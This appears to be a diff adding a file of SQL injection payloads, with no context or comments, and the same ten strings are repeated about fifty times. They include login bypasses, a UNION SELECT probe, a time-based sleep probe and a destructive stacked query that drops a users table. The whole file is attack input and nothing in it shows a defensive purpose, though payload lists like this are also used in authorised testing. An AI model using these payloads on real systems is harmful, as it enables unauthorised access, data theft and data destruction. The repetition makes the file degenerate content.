@@ -1,0 +1,500 @@
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
+' OR '1'='1
+' OR 1=1 --
+' OR 'a'='a
+'; DROP TABLE users; --
+" OR "" = "
+admin' --
+' OR 1=1#
+' OR sleep(5)--
+' OR 1=1 LIMIT 1 --
+' UNION SELECT NULL,NULL--
